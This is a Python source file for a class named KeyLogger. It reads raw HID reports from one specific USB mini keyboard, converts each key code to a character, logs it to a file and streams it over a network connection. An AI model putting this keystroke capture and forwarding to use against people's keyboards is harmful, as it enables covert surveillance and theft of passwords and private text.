import logging
from typing import Optional
import usb.core, usb.util
from src.DataHandler import DataHandler
from src.Forwarder import Forwarder
import hid


class NoDeviceFound(Exception):
    def __init__(self, devices: list = []):
        super().__init__(f"No forward device found in {devices}")


class KeyLogger:
    __slots__ = ["__devices", "data_handler", "__forwarder", "keyboard_layout"]

    def __init__(
        self,
        keyboard_layout: dict[int, int],
        data_handler: DataHandler,
        forwarder: Forwarder,
    ) -> None:
        # get all USB Devices
        self.__devices: list[int, int] = self.get_devices()
        # create a data handler
        self.data_handler = data_handler
        # create a forwarder
        self.__forwarder = forwarder
        # set keyboard
        self.keyboard_layout = keyboard_layout

    def __del__(self):
        pass

    # def __find_device(self, with_device: str = "forward") -> Optional[usb.core.Device]:
    #     id_vendor: int = 0x1c4f
    #     device_id: int = 0x008b
    #     if id_vendor == 0 or device_id == 0:
    #         raise NoDeviceFound(self.__devices)
    #         pass
    #     else:
    #         try:
    #             # Find the USB device
    #             device = usb.core.find(idVendor=id_vendor, idProduct=device_id)
    #             if device.is_kernel_driver_active(0):
    #                 try:
    #                     device.detach_kernel_driver(0)
    #                 except usb.core.USBError as e:
    #                     print("Could not detach kernel driver: %s" % str(e))
    #             # Release the device from any other processes
    #             usb.util.dispose_resources(device)
    #             # Check if the device is still busy
    #
    #             if device.is_kernel_driver_active(0):
    #                 print("Device is still busy, could not release resources")
    #                 logging.error("FEEEEEEEEEEEEEEEEEEHLER")
    #             else:
    #                 return device
    #         except Exception as e:
    #             logging.error(f"{e}")
    #             return None

    @staticmethod
    def get_devices() -> list[[int, int]]:
        devices = usb.core.find(find_all=True)
        found_devices: list[[int, int]] = []
        # Enumerate over all USB devices
        for device in devices:
            print(device)
            try:
                found_devices.append([device.idVendor, device.idProduct])
            except usb.core.USBError as e:
                print(f"Error reading Vendor ID: {e}")
        return found_devices

    def run(self):
        # #Mini Keyboard
        id_vendor = 0x1C4F
        device_id = 0x008B
        keyboard = hid.device()
        keyboard.open(id_vendor, device_id)
        while True:
            try:
                data = keyboard.read(8)  # Read an 8-byte HID report
            except OSError:
                logging.error("Keyboard no longer connected")
                # close all network sockets
                self.__forwarder.__del__()
                exit()
            if data:
                key_code = data[2]  # The key code is in byte
                try:
                    offset: int = self.keyboard_layout[str(key_code)]
                    if offset is None:
                        continue
                except KeyError:
                    logging.error(f"Key {key_code} not in the layout")
                    continue
                char: chr = chr(offset + key_code)
                try:
                    self.__forwarder.send_over_network(data=char)
                    # write data in file
                    self.data_handler.write(f"{key_code} {char}")
                except ConnectionResetError:
                    self.__forwarder.listen()
